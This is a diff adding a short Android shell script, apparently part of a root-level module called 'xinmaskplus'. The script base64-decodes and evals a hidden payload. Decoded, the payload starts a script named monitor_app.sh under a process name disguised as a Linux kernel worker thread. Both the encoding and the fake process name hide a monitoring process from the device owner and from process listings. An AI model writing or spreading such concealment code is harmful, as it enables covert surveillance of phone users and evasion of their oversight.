@@ -1,0 +1,5 @@
+#!/system/bin/sh
+eval "$(base64 -d << 'B64END'
+IyEvc3lzdGVtL2Jpbi9zaApNT0RESVI9Ii9kYXRhL2FkYi9tb2R1bGVzL3hpbm1hc2twbHVzIgpESVNHVUlTRURfTkFNRT0ia3dvcmtlci8xOjAtbW1fcGVyY3B1X3dxIgpleGVjIC1hICIkRElTR1VJU0VEX05BTUUiIC9zeXN0ZW0vYmluL3NoICIkTU9ERElSL3NjcmlwdHMvbW9uaXRvcl9hcHAuc2gi
+B64END
+)"
